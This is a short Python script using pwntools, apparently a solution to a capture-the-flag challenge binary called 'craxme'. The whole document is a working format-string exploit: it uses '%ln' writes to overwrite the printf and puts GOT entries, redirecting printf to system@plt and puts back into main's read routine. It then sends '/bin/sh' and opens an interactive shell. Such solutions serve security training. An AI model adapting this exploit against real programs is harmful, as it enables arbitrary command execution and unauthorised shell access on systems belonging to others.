from pwn import *

system_plt = 0x4005a0
printf_got = 0x601030
puts_got = 0x601018
main_read = 0x400747

r = process('./craxme')

payload  = "%{}c%{}$ln".format(system_plt, 10).ljust(16, 'a')
payload += "%{}c%{}$ln".format(main_read-system_plt-1, 11).ljust(16, 'a')
payload += p64(printf_got)
payload += p64(puts_got)

r.sendline(payload)
r.sendline('/bin/sh\x00')
r.interactive()
